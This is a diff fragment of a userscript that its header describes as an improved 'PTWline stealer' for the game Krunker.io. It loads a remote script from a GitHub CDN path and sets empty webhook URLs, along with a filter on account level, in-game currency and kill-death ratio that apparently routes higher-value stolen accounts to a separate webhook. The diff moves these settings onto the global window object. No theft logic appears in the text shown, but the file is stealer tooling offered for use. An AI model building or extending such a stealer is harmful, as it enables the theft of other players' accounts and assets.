@@ -24,9 +24,9 @@ An improved version of PTWline stealer for Krunker.io.
 // @require      https://cdn.jsdelivr.net/gh/z3db0y/Z3Dline/dist.js
 // ==/UserScript==
 
-const LO_WEBHOOK_URL = '';
-const HI_WEBHOOK_URL = '';
-const HI_FILTER = {
+window.LO_WEBHOOK_URL = '';
+window.HI_WEBHOOK_URL = '';
+window.HI_FILTER = {
     lvl: 0,
     kr: 0,
     kdr: 0,
